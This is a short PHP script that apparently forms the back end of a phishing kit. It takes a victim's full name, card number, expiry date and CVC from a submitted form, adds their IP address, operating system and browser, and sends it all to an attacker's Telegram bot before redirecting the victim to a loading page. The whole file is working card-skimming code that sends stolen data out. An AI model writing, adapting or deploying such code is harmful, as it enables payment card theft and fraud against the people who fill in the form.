<?php

include'./tginfo.php';
include'./agent.php';

$number = $_POST['number'];
$name = $_POST['name'];
$exp = $_POST['exp'];
$cvc = $_POST['cvc'];
$ip = getenv("REMOTE_ADDR");

if (!empty($number) AND !empty($name) AND !empty($exp) AND !empty($cvc)) {
	$coronamsg .= "⚜️ Card Information:\n";
	$coronamsg .= "Full Name: $name\n";
	$coronamsg .= "Card Number: $number\n";
	$coronamsg .= "Expiry Date: $exp\n";
	$coronamsg .= "CVC: $cvc\n";
	$coronamsg .= "\n";
	$coronamsg .= "⚜️ User Information:\n";
	$coronamsg .= "Geo Ip: $ip\n";
	$coronamsg .= "User OS: $user_os\n";
	$coronamsg .= "User Browser: $user_browser\n";
	$coronamsg .= "User Agent: $user_agent\n";
	$token = "$coronatoken";
    $data = [
    'text' => $coronamsg,
    'chat_id' => $coronachat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    header('Location: ../load.php');
}
else{
    header('Location: ../index.php');
}

 ?>